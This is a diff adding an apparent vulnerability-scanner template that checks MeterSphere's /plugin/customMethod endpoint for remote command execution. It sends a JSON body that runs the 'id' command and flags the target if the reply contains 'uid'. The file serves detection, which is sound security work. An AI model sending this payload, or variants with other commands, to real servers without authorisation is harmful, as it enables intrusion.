@@ -1,0 +1,17 @@
+name: MeterSphere-customMethod-rce
+set:
+  s1: randomInt(1000,9999)
+groups:
+  poc:  
+    - method: POST
+      path: /plugin/customMethod
+      headers:
+        Content-Type: application/json
+        Accept-Encoding: gzip
+      body: |
+        {"entry":"Evil","request":"id"}
+      expression: >-
+        response.status == 200 && response.body.bcontains(b"uid")
+  author: 
+  links:
+  
